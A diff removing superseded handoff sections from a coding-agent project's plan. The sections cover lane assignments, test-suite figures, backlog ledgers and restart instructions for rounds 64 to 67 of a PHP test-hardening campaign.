-  (F4 at `9f0c5db62` was the FOURTH full-suite-gate-miss of the era — an implied DTO edit invisible to every
-  in-lane filter; the merged suite is the only honest gate).
-- **by-path `require` = load-graph coupling** — moving a symbol that any sibling tool requires BY PATH breaks
-  at LOAD time where no test filter runs (dc×df at `4610f3580`); grep consumers of moved symbols before the
-  move, and require canonical instruments by path — never fork a third copy.
-
-**Carried from -67 (still binding, not restated in full here):** the rule-6 merge SEXTET; never
-oversubscribe CI K (K=min(nproc,4)); GUARD-FAMILY FILTER MANDATE in every builder AND reviewer brief
-(`--filter '(SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget)'`
-— now 56T/4708A at tip); re-shape corpus literals before re-pin; census PROSE_SITES legitimize
-in-step numeral flips; enumerate every census on a lane file before writing the brief.
-
-**Lane naming (in force):** two-letter ids, FIRST letter = round-group, SECOND = lane within the round
-(r64=a*, r65=b*, r66=c*, **r67=d***). Branch `lane/<id>`, sandbox `crush-lane-<id>`, artifacts
-`/home/sites/crush-r61-artifacts/<id>/` (the artifacts root keeps its round-61 name across rounds).
-
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
-
-| figure | value | domain |
-|---|---|---|
-| **ROUND-66 FINAL / NEW ANCHOR** | **11,519 / 176,743 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** (gate wall 558s serial) | **LINKED, cwd = sugar-crush, at `61cde19c5`** — CI shard path K=4 conservation PASS (158s); `durations.tsv` 491 rows; five-guard 56T/4708A; Config filter 781T/31,014A GREEN (the cf-healed base-red is DEAD — `--filter Config` is safe to require in windows again) |
-| mid-round pin | 11,513 / 176,556 (`78a8f9d50`) | wave-1 landed; ce +13T/+200A (the +200A is doc-pair assert-when-matching churn, not new ground) |
-| xdebug caution | devbox xdebug 3.2 SEGFAULTS nondeterministically under full-suite coverage | use pcov (built from source) for coverage runs — cc established this so r67 doesn't re-chase it |
-
-### 2. ROUND 67 — WAVE-1 LANE LEDGER da–df — **LANDED 2026-09-11 at `fb5078e6d`** (kept as history + the derivation input for §2b; per-pick attribution in the worklog `## ROUND 67` block)
-
-| lane | scope | ids | owns (excerpt) |
-|---|---|---|---|
-| **da — swallowing-census family (HIGH, files disjoint from every other lane)** | E572/E578/E612 close the `SwallowingCatchCensusTest` blind spots (indirect-assertion + set_error_handler arms; the permissive-fallback keystone); E577 implements the resolved-FQN key OR display-label rename in `AssertionSwallowingCatchTest`; E615/E617 ride the same two files | E572, E577, E578, E612, E615, E617 | `tests/SwallowingCatchCensusTest.php`, `tests/Support/AssertionSwallowingCatchTest.php` |
-| **db — StderrEmitterCensus cluster (HIGH-heavy, ONE file)** | the eight stderr-site rows sharing `tests/Cli/StderrEmitterCensusTest.php`; E154 ships EXCLUDING its Chat/Bootstrap/NonInteractive site-halves — those route to de's files, record the carve | E154 (minus routed sites), E195, E228, E258, E259, E267, E269, E270 | `tests/Cli/StderrEmitterCensusTest.php` (+ the sited src files, judgment per row) |
-| **dc — child-process / scanner bundle (MEASURE-FIRST)** | E319/E342/E358 inverted-flag sentences (same 8 sentences fix once, close three); E174 trait extractions; E205/E235/E283/E343 scanner resolutions; E390/E505 pins; **E417: the prescribed fix is MEASURED-WRONG — triage row (at `:72` pre-closeout) records that naming a high fd in the descriptor spec does NOT stop inheritance; a row closes only by reaping in the spawning function — re-derive before touching** | E174, E205, E235, E283, E319, E342, E343, E358, E390, E417, E505 | `tests/Support/` child/scanner/guard files, `tests/ChatTest.php`, `tests/Backend/EngineBackendTest.php`, `tests/bootstrap.php` |
-| **dd — Config doc-oracle + drift-helper holes** | the 13 Config/doc-figure rows + the four `DuplicatedTestHelperDriftTest` acceptance holes (E272/E565/E610/E481 readOrFail/implicit-public/roster arms); NOTE cf's tripwire: any new Config-window test method must ship IN-STEP with the README/suite-figure pair or fold into existing methods | E111, E125, E127, E143, E144, E148, E149, E272, E331, E356, E357, E386, E481, E547, E565, E583, E610 | `tests/Config/`, `tests/Support/DuplicatedTestHelperDriftTest.php` |
-| **de — Chat.php behavioral cluster (HIGH)** | E3/E4/E175 input/palette routing behaviors + E17/E20 provider-side Chat seams; **Bootstrap items E45/E74/E78c WAIT for de to land (wave-2 of THIS round — same-file serialization on the Chat/Bootstrap pair, do not run them beside de)** | E3, E4, E17, E20, E175 | `src/Chat.php` (+ `src/Palette/PaletteState.php`, `src/Providers/CompleteResponse.php`, `src/Backend/EngineBackend.php` touch-lists) |
-| **df — sibling libs + CI + process/doc meta** | candy-core/sugar-dash/sugar-reel/candy-pty containment rows E366/E447/E448/E466/E370; CI harness E486/E629; process/doc reclass candidates E36/E93/E165/E107 — **includes running `BootstrapSkillSkipsTest` in isolation to settle E36's flag-sense claim** | E36, E93, E107, E165, E366, E370, E447, E448, E466, E486, E629 | sibling-lib dirs, `tools/`, `.github/workflows/ci.yml`, README/worklog meta files |
-
-**Unowned carries (pick next round or mint tranches):** E686 tranche-4 (HOOKS `CRUSH_*` 7×/8× dynamic
-roster — the natural next prose tranche); E43 adoption half (per-block reflow-vs-clip toggle — needs a
-rendering-lane decision, not a sweep); Phase 9 stays PARTIAL (composited in-pane surface + E62's
-permission-gated chrome bar); E12/E666 closed-by-decision route-(b) history matters before any
-composite-live re-open. **E653/E261/E440/E42/E678 CLOSED this round — none may re-open from old STEP
-text; the closeout notes carry the exact mechanisms.** (Wave-1 note: of this list, E3's seam, E686 t4 and
-E43's adoption half are now ROUTED into §2b; Phase 9 and the E12/E666 history stand as written.)
-
-### 2b. ROUND 67 — WAVE-2 ROSTER (LANDED at wave-2: dh `b08a96cf1` · dj `00c8bc14b` · di `a94628c5b` · dl `66b92e3d6`; routing verdicts below — kept as the derivation record)
-
-| lane | scope | ids | owns / notes |
-|---|---|---|---|
-| **dh — Bootstrap tail (base `fb5078e6d`; same-file serialization that made it wave-2 is SATISFIED — de landed at `2da286745`/`2973380d4`)** | E45(a) belt-and-braces arm comment; E74(b) `trustedSettingsRoots` fills inside the try; E78c; **E154 remainder — the `src/Cli/Bootstrap.php:5722` error_log site** | E45, E74, E78c, E154 | E78(b) already shipped as E653-B `/notices` (lane `0aebed27d` → pick `5010c8bb2`) and E78(d) at `e18184e8a` (r65 bc) — ONLY the a / c / b-site-5722 fragments remain. Census obligations when touching Bootstrap: the channel-5 PREFIXED_WRITER_SITES roster (28 sites / 6 once at tip), `BootstrapLaunchFormatConstantsTest` (any NEW sprintf there obliges it — r65 lesson), the launchNotices family. |
-| **di — DuplicatedTestHelper holes + `{@see}` sweep** | E272/E565/E610/E481 acceptance holes; E331/E356 — the FIFTH `significantTokens()` copy; E547/E583 `{@see}` passes | E272, E331, E356, E481, E547, E565, E583, E610 | Post-wave-1 the GlobDialect corpus sits settled at **131,765 = 365×361** — CITE, verify, and only then quote; re-shape glob-shaped literals before touching any corpus figure (dd's `'/docs/*.md'` drift is the cautionary tale). dd left E272/E565/E610/E481 deliberately for this lane. |
-| **routing (fold into dh/di or mint dj)** | E319 / E342 / E358 inverted-flag sentences (dc verified zero-in-file — the three share 8 sentences, fix once) | E319, E342, E358 | de-adjacent files (`tests/ChatTest.php`, `tests/Backend/EngineBackendTest.php`, `tests/bootstrap.php`) — routable NOW that de has landed and moved. |
-| **E3 palette seam (needs a TUI lane owning `src/Renderer.php`)** | the caret decision: `src/Renderer.php:3600` prints an unconditional `'█'` and the flip needs PaletteState plumbing | E3 (PARTIAL) | de MEASURED and SEAM-REFUSED this at `2da286745` — ownership, not difficulty. Renderer collisions: the r62 H/R precedent (top-of-file vs mid-file hunks). |
-| **E686 tranche-4** | HOOKS.md `CRUSH_*` 7×/8× roster claims → dynamic derivation (env-registry figures must not be hand-typed) | E686 (PARTIAL) | Carried from cb@r66 (`51e59798d`); DocFigureProseDriftTest stands at 18 arms — new arms flip the census numeral trio IN-STEP. |
-| **verdict items (no code without measurement)** | E36 — settle the flag-sense claim by running `BootstrapSkillSkipsTest` in ISOLATION (df carried it unfixed); E93 / E165 / E107 — NO-FIX candidates, stamp by verdict; E43 — stays PARTIAL (adoption half unowned); E639 / E206 / E12 — pending OPERATOR (stop-and-ask list) | E36, E93, E165, E107, E43, E639, E206, E12 | **ERRATA vs the wave-1 brief: "E214→CLOSED (9f0c5db62)" and "E42b→CLOSED (351d5a915)" were REFUSED at closeout — `git log -S` over `d15bdefdf..fb5078e6d` returns ZERO for both. E214 stays PARTIAL (its (b) widening remains the measured-refusal / E686 campaign); E42b names no ledger row (the F1 heal is recorded at E137's CLOSED row). Do not re-litigate from old prose.** |
-
-**ROUND-67 CLOSE checklist — EXECUTED at this close (see §0-NOW-69):** worklog `## ROUND 67` CLOSED rewrite ✓ +
-new §0-NOW-69 ✓ + backlog/triage stamps ✓ + **filemap regen at the new tip** ✓ (the disclosed +6 was
-reconciled by evidence — verdict at the triage header: arithmetic-born, not row-lag) + E417 backlog renote ✓ +
-da roster byte-identical-dup cosmetic → ROUTED to r68 **ee** + `Chat::dropLast` docblock (says grapheme, walks
-codepoints) → ROUTED with eb + `src/Backend.php` `$onEvent` docblock drift (names 2 event classes; must add
-SpendCapBreached) → UNOWNED carry + `ProcessReaper::escalate` family prose (doesn't yet name the pty path) →
-UNOWNED carry + durations/README/suite-figure sextet re-pin ✓ (`323605773`) + `crush_code.md` pointer flip ✓.
-
-### 3. LEDGER AFTER ROUND 66
-
-685 entries: **11 CLOSED** (E657, E658, E659, E662, E670, E687, E691, E678-superseded, E261, E440, E42),
-**E653 FULL CLOSED** (Shape B landed — no count move; the entry left the actionable set in r65),
-**E686 re-annotated** (tranche-3 at `51e59798d`, DocFigure 18 arms; campaign continues), **E43
-re-measured stays PARTIAL**, two no-op verdicts recorded (cg/ch — already-landed, zero diff). Two
-inline errata (E658 31/81→~77/~35; ce +13th-case attribution) — honest record, no history rewrite.
-Actionable **111 → 100**. (File-map row census: 106 OPEN-family rows = ledger 100 + 6 pre-existing table
-drift since `0c61c0686`; header arithmetic authoritative per rounds-64–66 precedent; reconcile by
-evidence at the r67 close — see the census note atop `crush_code_filemap.md`.)
-
-**WAVE-1 AMENDMENT (round 67, superseded by §0-NOW-69 §3 — the final figures are chained 49 / row census 55):** **39 rows CLOSED** at the wave-1
-chain (da 6: E572/E577/E578/E612/E615/E617 · db 6: E195/E258/E259/E267/E269/E270 · dc 6: E174/E205/E235/
-E283/E343/E417-no-code · dd 9: E111/E125/E127/E143/E144/E148/E149/E357/E386 · de 4: E4/E17/E20/E175 ·
-df 8: E366/E370/E447-refuted/E448/E466/E486/E566/E629); **E3 → PARTIAL** (seam recorded), **E154 stays
-PARTIAL** (owned half shipped, `:5722` → dh), E686 re-annotated (t4 → §2b); **REFUSED: E228, E214, E42b**
-(zero `git log -S` trace across the whole chain — refusals noted inline on their rows). Actionable
-**100 → 61**. Full attribution: worklog `## ROUND 67` + triage header + per-row stamps.
-
-### RESTART INSTRUCTIONS — the new-session startup recipe (-68)
-
-1. Read this §0-NOW-68, the worklog tail (`## ROUND 66` in `docs/plans/crush_code_worklog.md`), and
-   `docs/plans/crush_code_filemap.md`.
-2. Pre-flight: `php scripts/refresh-deps.php --status` → linked **18/18 + 7/7** (the `*** WANTED
-   PUBLISHED ***` banner is cosmetic); `git status` clean at or above tip `fb5078e6d` (floor measured at
-   `56501908d`; the wave-1 bookkeeping docs commits above it are inert); if any figure is doubted, run
-   the floor gate FIRST: `bash scripts/parallel-tests.sh --durations scripts/parallel-tests-durations.tsv
-   --against-json sugar-crush/tests/Config/Support/suite-figure.json` — K defaults to min(nproc,8),
-   ~65–80s at 11,566T, **through a PLAIN PIPE, not a PTY**; the serial 565s run is reserved for figure
-   re-pins only.
-3. Wave-1 is MERGED — brief §2b's WAVE-2 set (dh, di, the E319/E342/E358 routing, the E3 TUI-lane
-   decision, E686 t4, and the verdict items); no STEP 1 remains.
-4. Then lanes per §2b with the filemap ownership sets (**filemap regen is a round-CLOSE chore — the map
-   lags wave-1 until then; treat the worklog `## ROUND 67` block as the current ownership record**);
-   `src/Renderer.php` stays collision-flagged until the E3 lane cuts. Sandboxes: wave-1 slots da–df + ks
-   are RETIRED (on-disk `crush-lane-{da..df,ks}` are landed work, and `{ca..cf,cc..ce,ba..be,e671,ab..af}`
-   are stale bases) — **cut fresh `crush-lane-dh` / `crush-lane-di` off `fb5078e6d`**; fresh cuts are the
-   standing rule.
-5. Per-bundle loop: implement (task+coder) → review (task+coder, verdict-first, WITH the five-guard
-   filter) → fix round → merged-suite green (PIPE, not PTY) → commit (author `Joe Huss <[EMAIL]>`).
-   Never push standing.
-6. Close the round: worklog entry + triage/backlog stamps + a new `§0-NOW-69` + filemap regen +
-   `crush_code.md` pointer flip + durations/README figure re-pin (sextet).
-7. Honor rules 1–10 + the -66/-67/-68 addenda throughout. STOP only at the four stop-and-ask items. Run
-   the plan to completion — **do not stop at round boundaries to ask.**
-
----
-
-## 0-NOW-67. ROUND 65 CLOSED (linked floor 11,494 / 176,293; minting debt CLOSED; five-guard mandate live) — ROUND 66 LANES NEXT
-
-**Written 2026-09-11 at `0c61c0686`. §0-NOW-66 below is superseded history — but its machinery SURVIVES
-and stays in force: operating rules 1–10 VERBATIM (with the -66 addenda and the five -67 addenda below),
-§3 of §0-NOW-62 (prove the vendor closure before the suite), §4 (cwd/mode/skip table), §4b (the `cp -a`
-lane recipe). Only FIGURES and lane assignments are dead. The STEP-1 minting debt is CLOSED — the
-`### E652–E688` headings landed at `25924d512`; E689–E692 already had theirs. Floors are MODE-DOMAIN:
-never quote a published figure into a linked brief or the other way, and always name cwd + mode beside
-every number.**
-
-### STANDING ORDER — run this plan to completion
-
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
-
-1. Work §2's round-66 candidates **α, β, γ, δ, ε** (supervisor picks the set; no STEP 1 remains), close
-   the round (worklog entry + a new `0-NOW-68` section + backlog/triage stamps + filemap regen), then
-   **immediately choose round 67** from what round 66 files, and keep going — rounds continue until no
-   actionable backlog remains and all plan §8b items land.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   If you are running out of context, doing that is the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports.** Round 65's merge gates reddened on guards the lanes' own filters could
-   not see (wave-1 `DuplicatedTestHelperDrift`; bd's GlobDialect + ChildWallClock) — verify every claim
-   against `git log` and the tree before bookkeeping.
-
-**STOP AND ASK only for these:** an E639-class decision taken AGAINST the recommendation; anything that
-would REMOVE unfinished/dormant/unwired code (fix it or wire it, never delete); a `git push` or changes
-to `prompt_*.md`; a blanket total-request timeout on an LLM call (the E646 rule — contain with the LEASE
-frame, never with a cap).
-
-#### Session operating rules (1–10 inherited VERBATIM from §0-NOW-65 — round-65 evidence confirmed the whole set; -66 addenda survive, -67 set below)
-
-**ADDENDA at -67 (five):**
-
-- **Rule 6 is a SEXTET at merge**: suite-figure.json + README headline + artifact + guard +
-  `scripts/parallel-tests-durations.tsv` + README prose — both r65 re-pins (`74d16914e`, `0c61c0686`)
-  flipped the sextet as one set; the durations manifest now carries 489 rows.
-- **GUARD-FAMILY FILTER MANDATE (every builder AND reviewer brief)** — run, in addition to the task
-  filter: `--filter '(SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget)'`.
-  Three consecutive rounds of targeted-filter misses (r64 ac/ad; r65 wave-1 + bd) make this proven, not
-  theoretical; the five-guard family stood 50T/4526A EXIT 0 at tip.
-- **Never oversubscribe CI K** — K=min(nproc,4); ≥2× CPU pressure trips the lease/idle-ceiling races
-  (unchanged from -66).
-- **Re-shape the corpus BEFORE re-pin** — a new string literal that the harvesters read (glob dialects)
-  moves guarded figures; prefer the token variant with identical meaning (`'(?:s)?'`, not `'s?'`) so the
-  documented number stays TRUE; re-pinning a guard to your own residue converts a tripwire into a
-  rubber stamp (bd review-2 `d26dd4377` is the pattern; final re-pin `0c61c0686` carried the legitimate
-  131,040→131,765 corpus re-measure only after the re-shape).
-- **Census PROSE_SITES rows legitimize out-touch-list numeral flips** — when a census scan obliges a
-  numeral edit in a file outside your lane (bd: `Chat.php` docblock, `McpToolWiringTest`,
-  `docs/SETTINGS.md`), flip it IN-STEP, numeral-only, zero behavior, and declare it in REPORT. And
-  enumerate every census that scans a lane file BEFORE writing the brief — `BootstrapLaunchFormatConstantsTest`
-  was the fifth Bootstrap census nobody predicted (any new `sprintf` there obliges it).
-
-**Lane naming (in force):** two-letter ids, FIRST letter = round-group, SECOND = lane within the round
-(r64=a*, r65=b*). Branch `lane/<id>`, sandbox `crush-lane-<id>`, artifacts
-`/home/sites/crush-r61-artifacts/<id>/` (the artifacts root keeps its round-61 name across rounds).
-
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
-
-| figure | value | domain |
-|---|---|---|
-| **ROUND-65 FINAL / NEW ANCHOR** | **11,494 / 176,293 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** (gate wall 559s serial, double-consistent) | **LINKED, cwd = sugar-crush, at `0c61c0686`** — CI shard path K=4 conservation PASS (157s outer, slowest shard 156s); `durations.tsv` 489 rows; five-guard 50T/4526A |
-| mid-round pins | 11,480 / 175,940 (`74d16914e`) | wave-1 landed +18 methods vs the +17 brief estimate (benign); bd +6T and be +8T deltas hit exactly |
-
-### 2. ROUND 66 — LANE CANDIDATES α–ε (concurrency 8 KEEP-FILLED; ownership verbatim into briefs; refuse out-of-lane edits, report seams)
-
-| lane | scope | ids | owns (excerpt) |
-|---|---|---|---|
-| **α — test-prose carry bundle** | E657/E658 residual `File.php:NNN` citations → rule-4 symbol re-anchors (prose only, floor-exact discipline); E659's guard-test rename must land in ONE commit with `tests/Context/RepoMapBlockTest.php:1210`'s `{@see}` + `SymbolCitationDriftTest`; E662 record-only re-derive | E657, E658, E659, E662 | `src/Providers/`, `src/Runtime.php` (prose), ~20 tests dirs, `tests/Tools/`, `tests/Context/` |
-| **β — E686 tranche-3** | the carry row of `be/measures.md`: SglangProvider measured tables (fixture-domain), AgentPoolConfig external claim, ProcessExecutor 20ms tick (labeled), `WorkflowEngine.php:335` "up to 30s" (loose), plus the remaining ~50 figure-bearing files from ae's census | E686 | `sugar-crush/tests/`, `docs/`, `README.md` |
-| **γ — E691 coverage job** | the `.github/workflows/ci.yml` coverage job is STILL serial for sugar-crush (test job sharded at `f67328f94`); `scripts/` has NO clover merge — a per-shard-clover → merged-report story must land before sharding | E691 | `.github/workflows/ci.yml`, `scripts/` |
-| **δ — E670 + E687 residuals** | E670: `WorkflowProviderHandoffTest.php:141` property-order nit (cosmetic, inside an existing pin); E687: E261's teardown fork-failure log needs the `StderrEmitterCensus` trio in-step — bd's r65 drain already flipped that roster 26→28, so the pairing precondition is LIVE | E670, E687 | `tests/Workflows/`, `tests/Cli/StderrEmitterCensusTest.php`, `src/Agents/AgentWorkerPool.php` |
-| **ε — E653 Shape B** | the `/notices` panel surface (bd reviewer seam): the ≤2-row transcript pack is Shape A; a full notices view needs `Chat.php` + README — real cost, its own lane | E653-B | `sugar-crush/src/Chat.php`, `README.md` |
-
-**E692 disposition note:** CLOSED-with-decision stamp recommended and applied at this close — the
-in-process, exec-free `pcntl_fork` at `EngineBackend.php:966` is out of `ProcessContainment`'s
-exec-spawn remit (no argv/PATH/interactive surface); the scope call landed as a comment in the
-`b7bb99ff5` hunk (pick `e18184e8a`). No lane needed. **Phase 9 stays PARTIAL:** layers B/C landed (bc);
-the remaining surface is the composited in-pane interactive UI and E62's permission-gated /
-visually-distinct chrome bar — live now that (C) is built. **E691 untouched by design in r65.**
-
-### 3. LEDGER AFTER ROUND 65
-
-685 entries: **6 CLOSED** (E653, E682, E683, E689, E690, E692-with-decision), **E686 re-annotated**
-(tranche-2 landed at `09c08c481`, 12 arms; the campaign continues), E691 untouched-stays-OPEN, the
-E633-family PARTIALs persist, `### E652–E688` headings minted (minting debt CLOSED at `25924d512`).
-Actionable **117 → 111**.
-
-### RESTART INSTRUCTIONS — the new-session startup recipe (-67)
-
-1. Read this §0-NOW-67, the worklog tail (`## ROUND 65` in `docs/plans/crush_code_worklog.md`), and
-   `docs/plans/crush_code_filemap.md`.
-2. Pre-flight: `php scripts/refresh-deps.php --status` → linked **18/18 + 7/7** (the `*** WANTED
-   PUBLISHED ***` banner is cosmetic); `git status` clean at or above tip `0c61c0686`; if any figure is
-   doubted, run the floor suite FIRST (559s serial @cwd=sugar-crush, or K=4 sharded via
-   `scripts/parallel-tests.sh`).
-3. No STEP 1 this round — the minting debt is CLOSED; go straight to lane selection.
-4. Then lanes per §2 with the filemap ownership sets; **ε owns `Chat.php` — serialize by file against
-   anything else touching it.** Sandboxes: the closeout directive is slots **ba–bf cut at
-   `0c61c0686`** — note the on-disk collision: the r65 `crush-lane-{ba,bb,bc,bd,be}` and r64
-   `crush-lane-{e671,ab,ac,ad,ae,af}` stay on disk until AFTER round-66 merges, so reuse of the `ba–be`
-   names requires retiring those dirs first or lettering the new slots per the standing two-letter
-   convention (r66→`c*`) — supervisor's call at launch.
-5. Per-bundle loop: implement (task+coder) → review (task+coder, verdict-first, WITH the five-guard
-   filter: `SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget`)
-   → fix round → merged-suite green → commit (author `Joe Huss <[EMAIL]>`). Never push standing.
-6. Close the round: worklog entry + triage/backlog stamps + a new `§0-NOW-68` + filemap regen +
-   `crush_code.md` pointer flip.
-7. Honor rules 1–10 + the five -67 addenda throughout. STOP only at the four stop-and-ask items. Run the
-   plan to completion — **do not stop at round boundaries to ask.**
-
----
-
-## 0-NOW-66. ROUND 64 CLOSED (linked floor 11,462 / 175,615; CI runs SHARDED) — ROUND 65 LANES b* NEXT
-
-**Written 2026-09-11 at `e028f142c`. §0-NOW-65 below is superseded history — but its machinery SURVIVES
-and stays in force: operating rules 1–10 VERBATIM (with the three -66 addenda below), §3 of §0-NOW-62
-(prove the vendor closure before the suite), §4 (cwd/mode/skip table), §4b (the `cp -a` lane recipe).
-Only FIGURES and lane assignments are dead. Floors are MODE-DOMAIN: never quote a published figure into
-a linked brief or the other way, and always name cwd + mode beside every number.**
-
-🔴 **STEP 1 FOR THE NEW SESSION — mint the `### E652+` headings in `crush_code_hardening_backlog.md`.**
-The standing minting debt now covers **E652–E692**: E689–E692 already have headings (minted at this
-close, the first past E651), but E652–E688 exist only as triage rows — copy each into a
-`### E<n> [STAMP] — title` heading with What/Where/Severity per the triage style, stamps taken from
-`docs/plans/crush_code_backlog_triage.md` (its authority for ids ≥ E652; E650/E651's one-word stamps
-lag there too). Docs-only — commit with a negative control, no suite run needed.
-
-### STANDING ORDER — run this plan to completion
-
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
-
-1. Land **STEP 1** (above), then work §2's lanes **ba, bb, bc, bd, be** as round 65. Close it (worklog
-   entry + a new `0-NOW-67` section + backlog/triage stamps + filemap regen), then **immediately choose
-   round 66** from what round 65 files, and keep going — rounds continue until no actionable backlog
-   remains and all plan §8b items land.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   If you are running out of context, doing that is the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports.** Round 64's full-suite gate caught defects the lane's own targeted runs
-   missed TWICE — verify every claim against `git log` and the tree before bookkeeping.
-
-**STOP AND ASK only for these:** an E639-class decision taken AGAINST the recommendation; anything that
-would REMOVE unfinished/dormant/unwired code (fix it or wire it, never delete); a `git push` or changes
-to `prompt_*.md`; a blanket total-request timeout on an LLM call (the E646 rule — contain with the LEASE
-frame, never with a cap).
-
-#### Session operating rules (1–10 inherited VERBATIM from §0-NOW-65 — round-64 evidence confirmed the whole set; -66 addenda after)
-
-**ADDENDA at -66:**
-
-- **Rule 6 is now a SEXTET at merge**: the quartet (suite-figure.json + README headline + artifact +
-  guard) plus `scripts/parallel-tests-durations.tsv` plus README — a new test file without a manifest
-  row makes CI conservation go red. The final re-pin `e028f142c` moved 11,459→11,462 exact-predicted.
-- **Every review brief includes the `SwallowingCatchCensus` + `OneSidedHomeSandbox` filter groups** —
-  round 64 proved targeted filters miss tree-wide guards twice (ac's start-failure contracts; ad's own
-  new tests reddening the censuses).
-- **Never oversubscribe CI K** — K=min(nproc,4); ≥2× CPU pressure trips the lease/idle-ceiling races
-  (K=8 refuted by measurement at `f67328f94`).
-
-**Lane naming (in force):** two-letter ids, FIRST letter = round-group, SECOND = lane within the round
-(r64=a*, r65=b*). Branch `lane/<id>`, sandbox `crush-lane-<id>`, artifacts
-`/home/sites/crush-r61-artifacts/<id>/` (the artifacts root keeps its round-61 name across rounds).
-
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
-
-| figure | value | domain |
-|---|---|---|
-| **ROUND-64 FINAL / NEW ANCHOR** | **11,462 / 175,615 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** (535s serial) | **LINKED, cwd = sugar-crush, at `e028f142c`** — CI shard path K=4 conservation PASS 156s |
-| predictions ledger | 11,444 / 11,459 / 11,462 — all three hit EXACTLY | additive-tests rule, ~15 rounds holding |
-
-### 2. ROUND 65 — FIVE FILE-DISJOINT LANES ba–be (concurrency 8 KEEP-FILLED; ownership verbatim into briefs; refuse out-of-lane edits, report seams)
-
-| lane | scope | ids | owns (excerpt) |
-|---|---|---|---|
-| **ba — mcp panel + LSP pump** | **E689** (/mcp TUI panel — E678 second half; `crush mcp --json` rows already DONE) + **E690** (mount pumpStderr at the LSP-side dispatch entry — E677 remainder; mirrors the MCP entry+timer mount) | E689, E690 | `sugar-crush/src/Tui/`, `src/Cli/Subcommands.php`, `src/LSP/`, `src/MCP/StdioMcpServer.php` |
-| **bb — JJ seams** | **E682** (composite adopts the abandoned-palette surface) + **E683** (KeyBindingRegistry prose + mouse pane-jump first-key seam) | E682, E683 | `sugar-crush/src/Renderer.php`, `src/App.php`, `src/Commands/KeyBindingRegistry.php` |
-| **bc — Phase-9 layer B/C** | interactive-PTY opt-in param (design settled round 40, layer A landed round 63, absent-pinned seam) | Phase9-B/C | `sugar-crush/src/Agents/`, `src/Backend/`, `src/Support/ProcessContainment.php` |
-| **bd — E653 re-derivation** | operator-drain half (shape WITHDRAWN at r62 — re-derive from the triage row before cutting the lane) | E653 | `sugar-crush/src/Cli/Bootstrap.php`, `tests/Cli/` |
-| **be — E686 tranche-2** | repo-wide figure remediation, bounded tranche (campaign, not a bundle) | E686 | `sugar-crush/tests/`, `docs/`, `README.md` |
-
-**E681 CLOSED** (save-order fix, `e4f46f7ed`). **E687** (stderr-site roster) stayed untouched — remains
-OPEN; pair with any stderr-site change. **E691** (coverage CI still serial for sugar-crush — needs a
-clover-merge story) and **E692** (EngineBackend.php:966 in-process `pcntl_fork` async-complete child —
-containment-scope call to make) stay unscheduled this round.
-
-### 3. LEDGER AFTER ROUND 64
-
-681 → **685** entries: **29+13 CLOSED this round** (E671–E677 minus the E678 half, E679–E681, E684,
-E685, E688), **E678 → PARTIAL** (panel half → E689), **E686 → PARTIAL** (tranche landed, campaign
-continues), E687 untouched-stays-OPEN, **E689–E692 minted (4)**; the E633-family PARTIALs persist.
-Actionable **131 → 117**.
-
-### RESTART INSTRUCTIONS — the new-session startup recipe (-66)
-
-1. Read this §0-NOW-66, the worklog tail (`## ROUND 64` in `docs/plans/crush_code_worklog.md`), and
-   `docs/plans/crush_code_filemap.md`.
-2. Pre-flight: `php scripts/refresh-deps.php --status` → linked **18/18 + 7/7** (the `*** WANTED
-   PUBLISHED ***` banner is cosmetic); `git status` clean at or above tip `e028f142c`; if any figure is
-   doubted, run the floor suite FIRST (535s serial @cwd=sugar-crush, or K=4 sharded via
-   `scripts/parallel-tests.sh`).
-3. **STEP 1 FIRST: mint the `### E652+` backlog headings** (docs-only, negative-control commit).
-4. Then lanes ba–be per the filemap ownership sets (ba/bb both touch the Tui render region — serialize
-   by file; bd shares Bootstrap.php with nothing live).
-5. Per-bundle loop: implement (task+coder) → review (task+coder, verdict-first, WITH the two census
-   groups + SwallowingCatchCensus/OneSidedHomeSandbox filters) → fix round → merged-suite green →
-   commit (author `Joe Huss <[EMAIL]>`). Never push standing.
-6. Close the round: worklog entry + triage/backlog stamps + a new `§0-NOW-67` + filemap regen +
-   `crush_code.md` pointer flip.
-7. Honor rules 1–10 + the -66 addenda throughout. STOP only at the four stop-and-ask items. Run the
-   plan to completion — **do not stop at round boundaries to ask.**
-
----
-
-## 0-NOW-65. ROUND 63 CLOSED (linked floor 11,438 / 175,211; README headline now census-pinned) — ROUND 64 NEXT
-
-**Written 2026-09-10 at `8c52b26e5`. §0-NOW-64 below is superseded history — but its machinery SURVIVES
-and stays in force: §3 of §0-NOW-62 (prove the vendor closure before the suite), §4 (cwd/mode/skip
-table), §4b (the `cp -a` lane recipe), rules 59–62, and the operating rules restated below. Only
-FIGURES and lane assignments are dead. Floors are MODE-DOMAIN: never quote a published figure into a
-linked brief or the other way, and always name cwd + mode beside every number.**
-
-🔴 **STEP 1 FOR THE NEW SESSION — E671: adopt `scripts/parallel-tests.sh` in `.github/workflows/ci.yml`.**
-This is the user's explicit ask — DO IT FIRST, as its own bundle, before any lane launches. K=8 on
-ubuntu-latest; the manifest comes from junit durations via `scripts/parallel-tests-make-shards.php`;
-include the conservation check (sharded totals vs the serial floor 11,438 / 175,211). The ctty runners
